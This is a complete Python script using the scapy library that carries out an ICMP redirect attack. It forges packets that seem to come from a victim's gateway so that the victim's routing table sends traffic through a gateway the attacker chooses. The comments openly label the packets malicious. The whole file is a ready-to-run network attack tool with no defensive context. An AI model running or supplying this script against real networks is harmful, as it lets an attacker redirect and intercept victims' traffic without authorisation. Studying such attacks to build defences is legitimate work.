#!/usr/bin/env python
import sys
from scapy.all import *
conf.verb=0
if len(sys.argv) != 5:
	
	print "Usage: ./icmp-redirect.py <target> <Gateway> <Route-entry> <Route-GW> \n"
	print "[*].. Target = Victim whose Routing table needs to be updated"
	print "[*].. Gateway = Gateway on the target -- should match on host in order to work"
	print "[*].. Route entry = Entry which needs to be added to the routing table"
	print "[*].. Route GW = The Gateway to use for the new route"
	sys.exit(1)

target=sys.argv[1]
gateway=sys.argv[2]	
route_to_add=sys.argv[3]
route_gw_to_add=sys.argv[4]

print("Crafting Malicious Packet to update the Routing table")
# creating a spoofed  IP packet to seem to origionate from Default GW of host
ip= IP()
ip.dst=target				# Address where update the routing table
ip.src=gateway				# Origional router on network

#creating ICMPredirect packet with the new gateway address.
icmp=ICMP()
icmp.type=5				# 5 for Redirect message.
icmp.code=1				# code 1 for host route.
icmp.gw=route_gw_to_add			# Malicious gateway entry

#Adding dummy packet with ICMP redirect which will update Route entry.
ip2=IP()
ip2.src=target				# Address of the victim
ip2.dst=route_to_add		# Entry to be added up with gw value of ICMP

udp=UDP()
print ("sending the malicious packet to %s to update its route table with %s") % (target, route_to_add)
send(ip/icmp/ip2/udp)
